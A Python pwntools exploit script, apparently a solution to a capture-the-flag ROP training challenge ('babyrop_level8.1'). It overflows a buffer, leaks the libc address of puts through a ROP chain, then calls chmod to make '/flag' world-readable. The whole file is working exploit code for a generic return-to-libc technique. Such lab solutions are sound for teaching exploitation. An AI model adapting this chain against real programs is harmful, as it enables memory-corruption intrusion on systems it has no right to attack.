from pwn import *

context.arch = "amd64"

elf = ELF("/challenge/babyrop_level8.1")

rop = ROP(elf)

io = elf.process()

buff_len = 40
libc = elf.libc


#libc.address = leak - libc.symbols.puts
#rop.rdi = p64(0x403681)
#rop.rsi = 0o777
#rop.call(libc.symbols.chmod)
rop.rdi = p64(elf.got.puts)
rop.call(p64(elf.plt.puts)) # puts address (puts(puts))
rop.challenge()
PAYLOAD = b"/flag\00"+b'A'*(buff_len-len("/flag\00")) + rop.chain()
io.send(PAYLOAD)
rop = ROP(elf)
io.recvuntil(b"Leaving!\n")
leak = u64(io.recv(6).ljust(8, b"\x00"))
print(hex(leak), hex(libc.symbols.puts))
libc.address = leak - libc.symbols.puts
rop.rdi = p64(0x402091)
rop.rsi = 0o777
rop.call(libc.symbols.chmod)
PAYLOAD = b"/flag\00"+b'A'*(buff_len-len("/flag\00")) + rop.chain()
io.send(PAYLOAD)
io.interactive()